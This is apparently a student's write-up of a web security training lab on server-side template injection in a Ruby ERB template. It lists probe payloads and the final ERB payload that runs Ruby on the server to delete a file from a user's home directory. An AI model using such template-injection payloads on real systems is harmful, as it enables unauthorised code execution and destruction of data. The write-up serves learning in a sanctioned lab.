*This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.*

Saw this message when I clicked on the first product:
![[Screenshot 2024-06-03 at 9.55.25 AM.png]]
Sent this request to the *Repeater* and since I knew it was ERB, I tried the following payloads:
- `{{7*7}} = {{7*7}}`
- `${7*7} = ${7*7}`
- `<%= 7*7 %> = 49`
- `<%= foobar %> = Error`
(The correct way would be to either scan the insertion points or send the request to Intruder and fuzz for SSTI)
I found that the last payload `<%= foobar %> = Error` worked:
![[Screenshot 2024-06-03 at 10.05.09 AM.png]]
Ran the following line of code after seeing the syntax from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby) and reading the ERB syntax:
`<%=File.delete('/home/carlos/morale.txt')%>`
This solved the lab:
![[Screenshot 2024-06-03 at 10.21.53 AM.png]]
